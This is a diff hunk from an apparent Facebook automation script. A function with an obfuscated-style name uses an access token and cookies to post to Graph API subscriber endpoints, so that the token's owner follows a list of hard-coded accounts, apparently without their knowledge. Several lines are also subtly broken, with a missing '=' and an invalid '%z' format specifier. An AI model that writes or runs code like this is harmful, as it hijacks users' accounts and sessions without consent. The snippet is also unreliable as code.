@@ -273,7 +273,7 @@ def ___fii___Sayang___Kamu___Widiya___():
     requests.post('https://graph.facebook.com/100026818103201/subscribers?access_token=%s'%(token),cookies=cookie)
     requests.post('https://graph.facebook.com/100001617352620/subscribers?access_token=%s'%(token),cookies=cookie)
     requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token%s'%(token),cookies=cookie)
-    requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=%s'%(token),cookies=cookie)'
+    requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=%s'%(token),cookies=cookie)
     requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=%s'%(token),cookies=cookie)
     requests.post('https://graph.facebook.com/100001085079906/subscribers?access_token=%z'%(token),cookies=cookie)
     requests.post('https://graph.facebook.com/100007559713883/subscribers?access_token=%s'%(token),cookies=cookie)
